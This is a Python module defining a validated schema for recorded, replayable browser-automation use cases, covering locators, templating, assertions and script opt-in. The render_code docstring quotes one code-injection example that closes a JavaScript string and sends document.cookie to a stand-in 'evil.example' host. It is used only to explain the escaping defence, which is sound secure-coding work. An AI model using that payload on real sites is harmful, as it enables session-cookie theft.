"""The ``UseCase`` schema -- a recorded run, distilled into something replayable.

This is the contract between the three phases. Distillation writes it, the
executor reads it, and the review UI edits it, so the validation here is doing
real work: it is the last point at which a malformed or unsafe use case can be
rejected before it runs a thousand times unattended.

Three structural decisions, each forced by a requirement rather than chosen for
elegance:

**Steps are split three ways.** A batch shares one browser session, so sign-in
must not run once per row. ``setup_steps`` run once per session, ``row_steps``
run once per input row, and ``row_reset`` puts the browser back to a known
state in between. A flat list cannot express that.

**Locators are a ranked list, not a selector.** A recorded CSS selector rots
the first time the site ships a redesign. ``role`` + accessible name resolved
against a *live* snapshot survives markup churn, so it leads the list and the
recorded selectors follow as fallbacks.

**Templating is confined to value-bearing fields.** ``{{input.x}}`` in a
selector would be a selector-injection hole and would make locator drift
impossible to debug, so the validator refuses it outright.
"""

from __future__ import annotations

import json
import re
import uuid
from datetime import datetime, timezone
from typing import Any, Literal

from pydantic import BaseModel, ConfigDict, Field, field_validator, model_validator

#: Bumped when a change to this file would make an older stored definition
#: invalid. Stored definitions carry the version they were written under.
SCHEMA_VERSION = 1

#: ``{{input.name}}`` / ``{{secret.name}}`` / ``{{env.name}}``. Whitespace
#: inside the braces is tolerated because humans edit these by hand.
TEMPLATE_RE = re.compile(r"\{\{\s*(input|secret|env)\.([A-Za-z_][A-Za-z0-9_]*)\s*\}\}")

Action = Literal[
    "navigate", "click", "fill", "fill_form", "select", "press",
    "hover", "upload", "download", "wait", "assert", "extract", "extract_rows",
    "script",
]

#: Actions that cannot be performed without knowing which element to act on.
#:
#: ``press`` and ``upload`` are deliberately absent. ``browser_press_key`` takes
#: only a key and sends it to whatever has focus, and ``browser_file_upload``
#: takes only paths and answers whichever file chooser is open -- neither is
#: ever recorded with a target. Requiring one made a recording containing an
#: Enter keypress impossible to distil at all.
ELEMENT_ACTIONS: frozenset[str] = frozenset(
    {"click", "fill", "select", "hover", "extract", "extract_rows", "download"}
)

#: Actions that may carry a locator but work fine without one.
OPTIONAL_LOCATOR_ACTIONS: frozenset[str] = frozenset({"press", "upload"})

Status = Literal["draft", "ready", "archived"]

#: How much a model is allowed to do while this use case runs.
#:
#: ``strict`` follows the recorded steps and cannot reach a model at all --
#: ``engine.py`` does not import ``llm``, so this is a property of the code
#: rather than a setting. ``guided`` runs exactly the same way until a step
#: stops matching, at which point one budgeted call re-finds the control and
#: the plan resumes; a row where nothing breaks costs nothing.
#:
#: There is deliberately no third value yet. A mode that works every row out
#: from the page has no implementation behind it, and offering one that does
#: nothing is worse than not offering it.
Mode = Literal["strict", "guided"]

#: Who produced this document. Recorded so a reviewer knows what they are
#: looking at, and so the two authoring paths can be told apart in a list.
AuthoredBy = Literal["person", "agent"]
FailureMode = Literal["abort", "continue", "heal"]


def _now() -> str:
    return datetime.now(timezone.utc).isoformat()


def template_refs(value: Any) -> set[tuple[str, str]]:
    """Every ``(kind, name)`` referenced by templates anywhere in ``value``."""
    found: set[tuple[str, str]] = set()
    if isinstance(value, str):
        found.update(TEMPLATE_RE.findall(value))
    elif isinstance(value, dict):
        for key, item in value.items():
            found |= template_refs(key) | template_refs(item)
    elif isinstance(value, (list, tuple)):
        for item in value:
            found |= template_refs(item)
    return found


def has_template(value: Any) -> bool:
    return bool(template_refs(value))



class TargetMissing(ValueError):
    """A use case named a target this deployment has no address for."""


def resolve_base_url(
    *,
    target: str,
    targets: dict[str, str],
    recorded: str,
    override: str = "",
) -> str:
    """Which site this run points at, in one place.

    Three sources, most specific first:

    1. **An override given when the run was started.** For a one-off against a
       branch deployment or a customer's own tenant, where standing
       configuration would be ceremony for a single run.
    2. **The target this use case names**, looked up in this deployment's own
       targets. The ordinary path: the definition says *which* site, the
       deployment says *where* that site is, and promoting a use case moves no
       address at all.
    3. **The URL recorded into the definition.** What makes a single-environment
       install work with nothing configured: record it, run it.

    A named target with no address here is an error rather than a fallback.
    Quietly dropping to the recorded URL would send a use case promoted to
    production at whatever host it happened to be recorded against, which is
    the exact accident this arrangement exists to prevent -- and it would do it
    silently, on a run somebody had every reason to trust.
    """
    if override:
        return override.rstrip("/")
    if target:
        found = targets.get(target)
        if not found:
            known = ", ".join(sorted(targets)) or "(none defined)"
            raise TargetMissing(
                f"This use case runs against the target {target!r}, and this "
                f"deployment has no address for it. Targets defined here: {known}. "
                f"Either add a target called {target!r} under Targets, or point this "
                f"use case at one that already exists -- the target is on the use "
                f"case's own screen, beside Pace. A single run can also be given an "
                f"explicit address when it is started."
            )
        return found.rstrip("/")
    return recorded.rstrip("/")


def effective_mode(mode: "Mode | None", *, healing_enabled: bool) -> "Mode":
    """What this use case actually does here, given what the deployment allows.

    The deployment setting is a **ceiling, not a decision**. An operator who
    turned healing off across an installation meant it, and a document arriving
    from another environment must not be able to switch it back on -- so
    ``healing_enabled=False`` answers ``strict`` whatever the document says.

    Under that ceiling the document decides, and ``None`` means it never got
    the chance: it was written before the field existed. Answering ``guided``
    there is what keeps an upgrade from quietly changing how a published use
    case behaves, because ``REPLAY_HEALING_ENABLED`` was the whole decision
    until now.
    """
    if not healing_enabled:
        return "strict"
    return mode if mode is not None else "guided"


class MissingValue(KeyError):
    """A template referenced an input or secret that was not supplied."""


def render_template(value: Any, *, inputs: dict[str, Any], secrets: dict[str, Any],
                    env: dict[str, Any] | None = None) -> Any:
    """Substitute templates through a string or a nested structure.

    Strict: an unsupplied reference raises rather than rendering an empty
    string. Silently typing "" into a login form and reporting success is the
    single worst failure mode a batch can have.
    """
    if isinstance(value, str):
        sources = {"input": inputs, "secret": secrets, "env": env or {}}

        def substitute(match: re.Match[str]) -> str:
            kind, name = match.group(1), match.group(2)
            source = sources[kind]
            if name not in source:
                raise MissingValue(f"{kind}.{name}")
            rendered = source[name]
            return "" if rendered is None else str(rendered)

        return TEMPLATE_RE.sub(substitute, value)
    if isinstance(value, dict):
        return {k: render_template(v, inputs=inputs, secrets=secrets, env=env)
                for k, v in value.items()}
    if isinstance(value, list):
        return [render_template(v, inputs=inputs, secrets=secrets, env=env) for v in value]
    return value


#: One pattern for both spellings a template can have inside JavaScript:
#: quoted (``page.fill('#name', '{{input.x}}')``) or bare
#: (``const n = {{input.x}};``).
#:
#: They are matched together, in one alternation, so that a single pass over
#: the source handles both. Two passes would rescan the first pass's output --
#: see render_code for why that is a security bug and not just untidy.
_CODE_TEMPLATE_RE = re.compile(
    # Quoted form first: the backreference requires the *same* quote to close,
    # so the whole literal is consumed and replaced by one JSON literal rather
    # than leaving the original quotes wrapped around it.
    r"""(['"`])\{\{\s*(input|secret|env)\.([A-Za-z_][A-Za-z0-9_]*)\s*\}\}\1"""
    r"""|\{\{\s*(input|secret|env)\.([A-Za-z_][A-Za-z0-9_]*)\s*\}\}"""
)


def render_code(
    code: str,
    *,
    inputs: dict[str, Any],
    secrets: dict[str, Any],
    env: dict[str, Any] | None = None,
) -> str:
    """Substitute templates into JavaScript source, safely.

    Two distinct hazards, and the second is easy to miss.

    **Splicing raw values into source is code injection.** This is why
    :func:`render_template` cannot be used here: it puts the value where the
    template was, which is right for a form field and wrong for JavaScript. A
    value of::

        '); fetch('https://evil.example/'+document.cookie); ('

    would close the string literal it sits in and run what follows. The values
    come from a spreadsheet somebody may have assembled with no idea it reaches
    a browser, so this is a real path. Each value is therefore emitted as a
    JSON literal: ``json.dumps`` escapes quotes, backslashes and newlines, and
    ``ensure_ascii`` turns U+2028/U+2029 into escapes, which JavaScript would
    otherwise read as line terminators.

    **Substituting twice re-expands the values.** ``re.sub`` does not rescan
    what it inserted, but a *second* ``sub`` call scans the first one's output.
    An earlier version of this function ran one pass for quoted templates and
    another for bare ones, so an input whose value was the text
    ``{{secret.password}}`` had that value substituted and then expanded --
    rendering the real credential into the page. A row of batch input could
    read any secret bound to the run.

    Hence one pattern and one pass. What a value contains is data, and stays
    data.
    """
    sources = {"input": inputs, "secret": secrets, "env": env or {}}

    def literal(kind: str, name: str) -> str:
        source = sources[kind]
        if name not in source:
            raise MissingValue(f"{kind}.{name}")
        value = source[name]
        return json.dumps("" if value is None else str(value), ensure_ascii=True)

    def replace(match: re.Match[str]) -> str:
        # Groups 1-3 are the quoted alternative, 4-5 the bare one.
        if match.group(2) is not None:
            return literal(match.group(2), match.group(3))
        return literal(match.group(4), match.group(5))

    return _CODE_TEMPLATE_RE.sub(replace, code)


# ---------------------------------------------------------------------------
# Leaf models
# ---------------------------------------------------------------------------


#: Strategies that carry a single string in ``text`` rather than a field of
#: their own. They exist because ``playwright codegen`` emits them, and each
#: maps to exactly one Playwright call -- which is the point: a recorded rung
#: should be a thing the browser knows how to find, not a thing this code has
#: to reinterpret.
STRING_STRATEGIES = frozenset({"text", "label", "placeholder", "test_id", "alt_text"})

#: Rungs that describe an element by what it *means* rather than by where it
#: sits or what it is called in the markup. These survive a redesign, so a
#: ladder is built with them first.
SEMANTIC_STRATEGIES = frozenset({"role", "label", "placeholder", "alt_text"})

#: Strategies that match by a *name* and so have a loose and a strict reading
#: of it. Playwright's ``exact`` parameter exists on exactly these calls;
#: ``get_by_test_id`` matches an attribute and has no such thing, and ``css``
#: and ``nth`` are not names at all.
NAMED_STRATEGIES = frozenset({"role", "label", "placeholder", "alt_text", "text"})


class Locator(BaseModel):
    """One rung of the locator ladder.

    ``role`` is resolved against a live snapshot at replay time and is the
    durable option; the rest are recorded fallbacks in decreasing order of how
    much site churn they survive.

    ``label``, ``placeholder`` and ``alt_text`` are nearly as durable, because
    all three *are* the element's accessible name as far as a page is
    concerned -- which is why they resolve the same way ``role`` does. They
    exist as separate strategies rather than being folded into ``role``
    because ``playwright codegen`` emits them, and rewriting a recorded
    ``get_by_label`` into a role guess would be this code inventing something
    the recorder did not say.

    ``test_id`` is a contract the site's own authors maintain, so it is stable
    until they change it -- but it is markup, not meaning, and it is absent
    from most pages.
    """

    model_config = ConfigDict(extra="forbid")

    strategy: Literal["role", "label", "placeholder", "test_id", "alt_text", "css", "text", "nth"]
    #: strategy="role"
    role: str | None = None
    name: str | None = None
    #: Whether the recorded name must be the element's *whole* accessible name.
    #:
    #: Playwright matches a name as a case-insensitive substring unless told
    #: otherwise, so a button recorded as "Invite" also matches "+ Invite
    #: User". Codegen writes ``exact=True`` when it needs to tell two such
    #: controls apart; carrying it is therefore not an optimisation but the
    #: difference between the recorded element and a different one.
    exact: bool = False
    #: Disambiguates when several nodes share role+name, and indexes `nth`.
    nth: int = 0
    #: strategy="css"
    selector: str | None = None
    #: The string for every strategy in :data:`STRING_STRATEGIES`.
    text: str | None = None

    @model_validator(mode="after")
    def _requires_its_own_field(self) -> "Locator":
        if self.strategy in STRING_STRATEGIES:
            required = "text"
        else:
            required = {"role": "role", "css": "selector", "nth": None}[self.strategy]
        if required and not getattr(self, required):
            raise ValueError(f"locator strategy {self.strategy!r} requires {required!r}")
        if self.strategy == "nth" and self.nth < 0:
            raise ValueError("locator strategy 'nth' requires a non-negative nth")
        return self

    @property
    def semantic(self) -> bool:
        """Whether this rung describes meaning rather than markup."""
        return self.strategy in SEMANTIC_STRATEGIES

    def describe(self) -> str:
        if self.strategy == "role":
            base = f'role={self.role}' + (f' name="{self.name}"' if self.name else "")
        elif self.strategy == "css":
            base = f"css={self.selector}"
        elif self.strategy in STRING_STRATEGIES:
            base = f"{self.strategy}={self.text!r}"
        else:
            base = f"nth={self.nth}"
        if self.exact and self.strategy in NAMED_STRATEGIES:
            base += " exact"
        return base if self.nth == 0 or self.strategy == "nth" else f"{base} [{self.nth}]"


class Assertion(BaseModel):
    """A check the executor evaluates locally -- no model, no judgement."""

    model_config = ConfigDict(extra="forbid")

    kind: Literal["url_contains", "text_present", "element_visible", "element_count", "title_contains"]
    value: str | None = None
    #: element_count only.
    count: int | None = None
    locator: Locator | None = None
    negate: bool = False
    timeout_ms: int = Field(default=10_000, ge=0, le=300_000)

    @model_validator(mode="after")
    def _requires_a_subject(self) -> "Assertion":
        if self.kind in {"url_contains", "text_present", "title_contains"} and not self.value:
            raise ValueError(f"assertion {self.kind!r} requires a value")
        if self.kind in {"element_visible", "element_count"} and self.locator is None:
            raise ValueError(f"assertion {self.kind!r} requires a locator")
        if self.kind == "element_count" and self.count is None:
            raise ValueError("assertion 'element_count' requires a count")
        return self

    def unsatisfiable_reason(self, allowed_domains: list[str]) -> str | None:
        """Why this assertion can never hold, or ``None`` if it might.

        The domain allowlist is enforced on every navigation, so it bounds
        where the browser can possibly be -- which makes some URL assertions
        provably false before anything runs. Catching those is worth doing
        deterministically: an assertion that cannot pass turns every row of a
        batch into a failure, and the failure message blames the page rather
        than the assertion.

        Deliberately conservative. It only reports a contradiction it can
        actually prove, because wrongly discarding a real check would remove
        the only thing standing between a batch and silent success.
        """
        if self.kind != "url_contains" or not self.value:
            return None

        domains = [
            d.strip().lower().removeprefix("*.")
            for d in allowed_domains
            if d and d.strip() and d.strip() != "*"
        ]
        # No allowlist, or a wildcard: the browser could be anywhere.
        if not domains or len(domains) != len([d for d in allowed_domains if d and d.strip()]):
            return None

        value = self.value.strip().lower()

        if self.negate:
            # "the URL must NOT contain X", where X is part of every domain the
            # run is allowed to reach. The allowlist forbids being anywhere else.
            if all(value in domain for domain in domains):
                return (
                    f"asserts the URL does NOT contain {self.value!r}, but this use case is "
                    f"restricted to {', '.join(allowed_domains)} -- so every page it can "
                    "reach contains that text and the check can never pass"
                )
            return None

        # "the URL must contain X", where X names a host that is not reachable.
        # Only applied when the value looks like a hostname, so a path check
        # like "/signin" is never touched.
        looks_like_host = "." in value and "/" not in value and " " not in value
        if looks_like_host and not any(
            value in domain or domain in value for domain in domains
        ):
            return (
                f"asserts the URL contains {self.value!r}, which is not among the domains "
                f"this use case may visit ({', '.join(allowed_domains)})"
            )
        return None

    def describe(self) -> str:
        body = {
            "url_contains": f"URL contains {self.value!r}",
            "title_contains": f"title contains {self.value!r}",
            "text_present": f"page shows {self.value!r}",
            "element_visible": f"{self.locator.describe() if self.locator else '?'} is visible",
            "element_count": f"{self.locator.describe() if self.locator else '?'} appears {self.count} time(s)",
        }[self.kind]
        return f"NOT {body}" if self.negate else body


class WaitFor(BaseModel):
    model_config = ConfigDict(extra="forbid")

    kind: Literal["time", "text", "text_gone", "load_state"]
    value: str | None = None
    seconds: float | None = Field(default=None, ge=0, le=120)
    state: Literal["load", "domcontentloaded", "networkidle"] | None = None
    timeout_ms: int = Field(default=15_000, ge=0, le=300_000)



class ExtractColumn(BaseModel):
    """One field to read out of each row of a list.

    ``selector`` is CSS, scoped **inside** the row, and that is deliberate
    rather than a shortcut. The semantic locators the rest of this schema
    prefers -- role, label, placeholder -- identify one element on a page; they
    do not address "the third cell of this row". A list page is structural, so
    the locator for a column is structural too. The row locator above it can
    still be semantic, and usually should be.

    ``attribute`` reads an attribute instead of the text. This is what makes
    discovery work at all: the identifier you need is almost never the visible
    label, it is the ``href`` of the link wrapping it.
    """

    model_config = ConfigDict(extra="forbid")

    name: str = Field(min_length=1, max_length=64)
    selector: str = Field(min_length=1, max_length=500)
    #: Empty reads the element's text.
    attribute: str = Field(default="", max_length=64)


class FormField(BaseModel):
    """One field of a ``fill_form`` batch."""

    model_config = ConfigDict(extra="forbid")

    name: str
    value: str = ""
    type: str = "textbox"
    locators: list[Locator] = Field(default_factory=list)


class InputSpec(BaseModel):
    model_config = ConfigDict(extra="forbid")

    name: str = Field(pattern=r"^[A-Za-z_][A-Za-z0-9_]*$")
    type: Literal["string", "url", "number", "boolean", "file"] = "string"
    required: bool = True
    default: Any = None
    description: str = ""
    example: str = ""


class SecretSpec(BaseModel):
    """A credential slot. Only ever a *name* -- values live in the vault."""

    model_config = ConfigDict(extra="forbid")

    name: str = Field(pattern=r"^[A-Za-z_][A-Za-z0-9_]*$")
    required: bool = True
    description: str = ""


# ---------------------------------------------------------------------------
# Steps
# ---------------------------------------------------------------------------


class Step(BaseModel):
    model_config = ConfigDict(extra="forbid", populate_by_name=True)

    id: str = Field(default_factory=lambda: f"s{uuid.uuid4().hex[:6]}")
    action: Action
    #: Human-readable, shown in the timeline and in failure messages.
    description: str = ""

    locators: list[Locator] = Field(default_factory=list)
    #: navigate
    url: str | None = None
    #: fill / select / press / upload
    value: str | None = None
    #: fill_form
    fields: list[FormField] = Field(default_factory=list)
    #: extract_rows -- what to read out of each row the locator matches.
    columns: list[ExtractColumn] = Field(default_factory=list)
    #: extract -- read this attribute rather than the element's text. An href
    #: is the usual reason: the identifier a later pass needs is in the link,
    #: not in the words a person sees.
    attribute: str = ""
    #: extract -- the key this step's value lands under in the row's outputs.
    output: str | None = None
    #: script -- raw JavaScript. Refused unless the use case opts in.
    code: str | None = None

    assertion: Assertion | None = Field(default=None, alias="assert")
    wait_for: WaitFor | None = None

    optional: bool = False
    on_failure: FailureMode = "abort"
    timeout_ms: int = Field(default=30_000, ge=0, le=300_000)

    #: Locator rungs the recorder saw fail. Kept for the review UI so a person
    #: can see what was tried, never executed.
    rejected_locators: list[Locator] = Field(default_factory=list)

    @model_validator(mode="after")
    def _action_has_what_it_needs(self) -> "Step":
        if self.action in ELEMENT_ACTIONS and not self.locators:
            raise ValueError(f"step {self.id!r}: action {self.action!r} requires at least one locator")
        if self.action == "navigate" and not self.url:
            raise ValueError(f"step {self.id!r}: 'navigate' requires a url")
        if self.action == "assert" and self.assertion is None:
            raise ValueError(f"step {self.id!r}: 'assert' requires an assertion")
        if self.action == "extract" and not self.output:
            raise ValueError(f"step {self.id!r}: 'extract' requires an output name")
        if self.action == "script" and not self.code:
            raise ValueError(f"step {self.id!r}: 'script' requires code")
        if self.action == "fill_form" and not self.fields:
            raise ValueError(f"step {self.id!r}: 'fill_form' requires at least one field")
        if self.action == "extract_rows" and not self.columns:
            raise ValueError(
                f"step {self.id!r}: 'extract_rows' requires at least one column. "
                "Without one it would find the rows and read nothing out of them."
            )
        if self.action == "download" and not self.output:
            raise ValueError(
                f"step {self.id!r}: 'download' requires an output name. The file is the "
                "point of the step, and the name is how a later row finds it."
            )
        if self.action == "extract_rows" and not self.output:
            raise ValueError(
                f"step {self.id!r}: 'extract_rows' requires an output name to land under"
            )
        if self.action == "wait" and self.wait_for is None:
            raise ValueError(f"step {self.id!r}: 'wait' requires wait_for")
        if self.action == "press" and not self.value:
            raise ValueError(f"step {self.id!r}: 'press' requires a key")
        if self.action == "upload" and not self.value:
            raise ValueError(f"step {self.id!r}: 'upload' requires a file path")
        return self

    @model_validator(mode="after")
    def _selectors_are_never_templated(self) -> "Step":
        """A templated selector is a selector-injection hole.

        It also makes drift undebuggable: when a locator stops matching you can
        no longer tell whether the site changed or the input did.
        """
        for locator in [*self.locators, *self.rejected_locators]:
            if has_template(locator.model_dump()):
                raise ValueError(
                    f"step {self.id!r}: templating is not allowed inside a locator "
                    f"({locator.describe()})"
                )
        for field in self.fields:
            for locator in field.locators:
                if has_template(locator.model_dump()):
                    raise ValueError(
                        f"step {self.id!r}: templating is not allowed inside a form field locator"
                    )
        return self

    def references(self) -> set[tuple[str, str]]:
        """Every ``(kind, name)`` this step's value-bearing fields reference."""
        return template_refs(
            {
                "url": self.url,
                "value": self.value,
                "fields": [f.value for f in self.fields],
                "assert": self.assertion.value if self.assertion else None,
                "wait": self.wait_for.value if self.wait_for else None,
                # Script code counts. It used to be excluded because nothing
                # substituted into it, so an input referenced there could never
                # be filled -- which meant a recording that drove a form via
                # JavaScript produced a use case with no inputs at all, asking
                # for nothing and typing "{{input.full_name}}" into the page.
                # render_code() makes the reference real, so it is now counted.
                "code": self.code,
            }
        )

    def summary(self) -> str:
        if self.description:
            return self.description
        if self.action == "navigate":
            return f"navigate to {self.url}"
        if self.action == "assert" and self.assertion:
            return f"assert {self.assertion.describe()}"
        if self.locators:
            return f"{self.action} {self.locators[0].describe()}"
        return self.action


# ---------------------------------------------------------------------------
# The use case
# ---------------------------------------------------------------------------


class UseCase(BaseModel):
    """A recorded run, parameterised and made replayable."""

    model_config = ConfigDict(extra="forbid", populate_by_name=True)

    schema_version: int = SCHEMA_VERSION
    id: str = Field(default_factory=lambda: uuid.uuid4().hex)
    name: str = Field(min_length=1, max_length=200)
    description: str = ""
    status: Status = "draft"
    #: The origin this was recorded against -- scheme and host, no path. It is
    #: what ``{{env.base_url}}`` falls back to when the deployment names no
    #: value of its own, which is what lets one document run unchanged in dev,
    #: UAT and production: dev needs no configuration at all, and the other two
    #: each set ``USECASE_ENV`` once. Empty on anything recorded before this
    #: existed, whose URLs are still literal and still work.
    base_url: str = ""
    #: The name of the target supplying this use case's base URL. The document
    #: says *which* site; each deployment says where that site is, so promoting
    #: a use case carries no address with it. Empty means "the URL recorded
    #: into this definition", which is what a single-environment install needs.
    target: str = ""
    #: How this use case runs, or ``None`` for "whatever the deployment says".
    #:
    #: The three-way split is deliberate and the reason is upgrades. A document
    #: written before this field existed has not chosen anything, and defaulting
    #: it to ``strict`` would silently switch healing *off* in a deployment that
    #: has ``REPLAY_HEALING_ENABLED=true`` today -- a behaviour change nobody
    #: asked for, arriving with a schema addition. ``None`` therefore means
    #: "inherit", and the moment somebody picks a mode on the screen it becomes
    #: explicit and wins over the deployment either way.
    mode: Mode | None = None
    #: Who wrote this document. Recorded rather than inferred: a use case
    #: distilled from an agent session and one recorded by hand are the same
    #: shape on purpose, so the provenance has to be carried, not guessed.
    authored_by: AuthoredBy = "person"
    version: int = 1
    source_run_id: str | None = None

    allowed_domains: list[str] = Field(default_factory=list)
    #: `script` steps refuse to run unless a human turns this on. See §9.3.
    allow_scripts: bool = False

    inputs: list[InputSpec] = Field(default_factory=list)
    secrets: list[SecretSpec] = Field(default_factory=list)

    #: Once per session. The login lives here.
    setup_steps: list[Step] = Field(default_factory=list)
    #: Cheap proof the shared session is still authenticated, checked between rows.
    session_check: Assertion | None = None
    #: Returns the browser to a known state before each row.
    row_reset: Step | None = None
    #: Once per input row.
    row_steps: list[Step] = Field(default_factory=list)
    teardown_steps: list[Step] = Field(default_factory=list)

    outputs: list[str] = Field(default_factory=list)
    #: Seconds to wait between rows, overriding the deployment default.
    #:
    #: Politeness is a property of the site, not of the installation. One
    #: vendor tolerates a request a second and another starts refusing after
    #: three; a single number in the environment cannot be right for both, and
    #: the person who recorded the workflow is the one who knows which site
    #: this is. None means "use REPLAY_ROW_DELAY_SECONDS".
    row_delay_seconds: float | None = Field(default=None, ge=0, le=600)
    warnings: list[str] = Field(default_factory=list)
    #: Recorded calls that did NOT become steps, and why. A recording keeps
    #: only what succeeded, so this is how a reviewer checks that nothing they
    #: needed was lost -- to a failure, or to a mis-detected one.
    dropped: list[str] = Field(default_factory=list)

    created_at: str = Field(default_factory=_now)
    updated_at: str = Field(default_factory=_now)

    # -- derived ------------------------------------------------------------
    @property
    def all_steps(self) -> list[Step]:
        reset = [self.row_reset] if self.row_reset else []
        return [*self.setup_steps, *reset, *self.row_steps, *self.teardown_steps]

    @property
    def input_names(self) -> set[str]:
        return {spec.name for spec in self.inputs}

    @property
    def secret_names(self) -> set[str]:
        return {spec.name for spec in self.secrets}

    @property
    def runnable(self) -> bool:
        return self.status == "ready" and bool(self.row_steps or self.setup_steps)

    # -- validation ---------------------------------------------------------
    @field_validator("allowed_domains")
    @classmethod
    def _clean_domains(cls, value: list[str]) -> list[str]:
        return [d.strip() for d in value if d and d.strip()]

    @model_validator(mode="after")
    def _step_ids_are_unique(self) -> "UseCase":
        seen: set[str] = set()
        for step in self.all_steps:
            if step.id in seen:
                raise ValueError(f"duplicate step id {step.id!r}")
            seen.add(step.id)
        return self

    @model_validator(mode="after")
    def _published_scripts_require_opt_in(self) -> "UseCase":
        """A *published* use case may not contain scripts without the opt-in.

        Checked at ``ready``, not at ``draft``, because a recording that used
        ``browser_run_code_unsafe`` must still be distillable -- otherwise the
        review UI could never show a person the code they are being asked to
        approve. The executor enforces the same rule again at run time, so a
        script step can never execute without a deliberate decision.
        """
        if self.allow_scripts or self.status != "ready":
            return self
        offenders = [s.id for s in self.all_steps if s.action == "script"]
        if offenders:
            raise ValueError(
                "cannot publish: this use case contains script steps ("
                + ", ".join(offenders)
                + ") but allow_scripts is false. A script step is arbitrary JavaScript against a "
                "live authenticated session; read the code, then enable it deliberately."
            )
        return self

    @property
    def script_steps(self) -> list[Step]:
        """Steps carrying raw JavaScript. Shown in full in the review UI."""
        return [s for s in self.all_steps if s.action == "script"]

    @property
    def blocked_scripts(self) -> list[str]:
        """Script step ids that will refuse to execute under the current setting."""
        return [] if self.allow_scripts else [s.id for s in self.script_steps]

    @model_validator(mode="after")
    def _setup_never_reads_a_row_input(self) -> "UseCase":
        """Setup runs once per batch, so a per-row input there is a modelling error.

        Left unchecked it would silently apply row 1's value to all 1,000 rows,
        which looks like success and is not.
        """
        offenders = [
            (step.id, name)
            for step in self.setup_steps
            for kind, name in step.references()
            if kind == "input"
        ]
        if offenders:
            detail = ", ".join(f"{sid} uses {{{{input.{n}}}}}" for sid, n in offenders)
            raise ValueError(
                "setup_steps run once per batch and cannot reference a per-row input "
                f"({detail}). Move the step to row_steps, or make the value a secret."
            )
        return self

    @model_validator(mode="after")
    def _templates_resolve_to_declared_names(self) -> "UseCase":
        known_inputs, known_secrets = self.input_names, self.secret_names
        missing: list[str] = []
        for step in self.all_steps:
            for kind, name in step.references():
                if kind == "input" and name not in known_inputs:
                    missing.append(f"{step.id}: {{{{input.{name}}}}}")
                elif kind == "secret" and name not in known_secrets:
                    missing.append(f"{step.id}: {{{{secret.{name}}}}}")
        if missing:
            raise ValueError(
                "these templates reference names that are not declared: " + "; ".join(missing)
            )
        return self

    def impossible_assertions(self) -> list[tuple[str, str]]:
        """``(where, why)`` for every assertion that can never hold.

        Covers the session check too: one that can never pass makes the batch
        runner think the session dropped after every single row, and re-run
        sign-in forever.
        """
        found: list[tuple[str, str]] = []
        for step in self.all_steps:
            if step.assertion is None:
                continue
            reason = step.assertion.unsatisfiable_reason(self.allowed_domains)
            if reason:
                found.append((step.id, reason))
        if self.session_check is not None:
            reason = self.session_check.unsatisfiable_reason(self.allowed_domains)
            if reason:
                found.append(("session_check", reason))
        return found

    @model_validator(mode="after")
    def _published_assertions_can_pass(self) -> "UseCase":
        """A published use case may not carry an assertion that can never hold.

        Checked at ``ready`` so a draft can still be inspected and repaired.
        """
        if self.status != "ready":
            return self
        broken = self.impossible_assertions()
        if broken:
            detail = "; ".join(f"{where} {why}" for where, why in broken)
            raise ValueError(f"cannot publish: {detail}")
        return self

    @model_validator(mode="after")
    def _published_inputs_are_all_used(self) -> "UseCase":
        """A published use case may not demand an input nothing reads.

        An unused input is worse than useless: whoever runs it has to supply a
        value for every row, and nothing does anything with it. It happens when
        a literal gets parameterised inside `script` code, which nothing can
        substitute into. Checked at ``ready`` so a draft can still be inspected.
        """
        if self.status != "ready":
            return self
        referenced = {
            name for step in self.all_steps for kind, name in step.references() if kind == "input"
        }
        unused = [spec.name for spec in self.inputs if spec.name not in referenced]
        if unused:
            raise ValueError(
                "cannot publish: these inputs are declared but no step reads them ("
                + ", ".join(unused)
                + "). Either wire them into a step or remove them -- asking for a value on "
                "every row and then ignoring it is never right."
            )
        return self

    @model_validator(mode="after")
    def _declared_outputs_match_extract_steps(self) -> "UseCase":
        produced = {
            s.output
            for s in self.all_steps
            if s.action in {"extract", "extract_rows", "download"} and s.output
        }
        declared = set(self.outputs)
        if declared - produced:
            raise ValueError(
                "outputs declared but never extracted: " + ", ".join(sorted(declared - produced))
            )
        return self

    # -- helpers ------------------------------------------------------------
    def missing_inputs(self, values: dict[str, Any]) -> list[str]:
        """Required input names absent from ``values``. Checked before the browser opens."""
        return [
            spec.name
            for spec in self.inputs
            if spec.required and spec.default is None and values.get(spec.name) in (None, "")
        ]

    def missing_secrets(self, values: dict[str, Any]) -> list[str]:
        return [
            spec.name
            for spec in self.secrets
            if spec.required and values.get(spec.name) in (None, "")
        ]

    def with_defaults(self, values: dict[str, Any]) -> dict[str, Any]:
        """Input values with declared defaults filled in."""
        merged = {s.name: s.default for s in self.inputs if s.default is not None}
        merged.update({k: v for k, v in values.items() if v is not None})
        return merged

    def bump(self) -> "UseCase":
        """A copy at the next version, stamped now. Versions are immutable."""
        return self.model_copy(update={"version": self.version + 1, "updated_at": _now()})
